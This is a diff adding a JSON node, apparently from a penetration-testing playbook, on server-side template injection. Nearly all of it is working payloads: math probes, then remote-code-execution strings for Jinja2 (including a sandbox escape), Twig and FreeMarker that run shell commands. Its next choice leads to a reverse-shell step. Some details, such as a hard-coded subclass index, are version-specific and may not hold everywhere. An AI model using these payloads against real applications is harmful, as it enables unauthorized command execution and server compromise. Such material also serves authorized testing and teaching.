@@ -1,0 +1,18 @@
+{
+  "id": "ssti",
+  "phase": "WEB",
+  "title": "SSTI — Template Injection",
+  "body": "Input reflected in a template engine. Test math expressions — if 7*7 returns 49, you have SSTI. Engine fingerprint determines the payload.",
+  "cmd": "# Probe — inject into every input field\n{{7*7}}       # if returns 49 = Jinja2/Twig\n#{7*7}        # if returns 49 = Ruby ERB\n<%= 7*7 %>    # ERB / EJS\n\n# Jinja2 (Python/Flask) — RCE\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n\n# Jinja2 sandbox escape\n{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}\n\n# Twig (PHP) — RCE\n{{['id']|filter('system')}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n\n# FreeMarker (Java)\n<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Got RCE via SSTI",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Reflected but no RCE — different engine",
+      "next": "web_fuzz_deep"
+    }
+  ]
+}
